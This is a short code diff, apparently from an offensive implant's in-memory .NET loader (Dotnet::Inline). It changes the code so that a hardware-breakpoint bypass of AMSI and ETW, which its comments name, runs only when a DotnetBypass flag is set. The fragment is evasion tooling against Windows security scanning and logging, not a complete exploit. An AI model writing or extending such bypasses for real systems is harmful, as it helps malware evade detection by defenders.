@@ -197,9 +197,9 @@ auto DECLFN Dotnet::Inline(
     //
     // active hwbp to bypass amsi/etw
     //
-    // if ( Self->Hw->DotnetBypass ) {
+    if ( Self->Hw->DotnetBypass ) {
         Self->Hw->DotnetInit();
-    // }
+    }
 
     //
     // load the dotnet
@@ -284,9 +284,9 @@ auto DECLFN Dotnet::Inline(
     //
     // desactive hwbp to bypass amsi/etw
     //
-    // if ( Self->Hw->DotnetBypass ) {
+    if ( Self->Hw->DotnetBypass ) {
         Self->Hw->DotnetExit();
-    // }
+    }
 
     //
     // allocate memory to output buffer
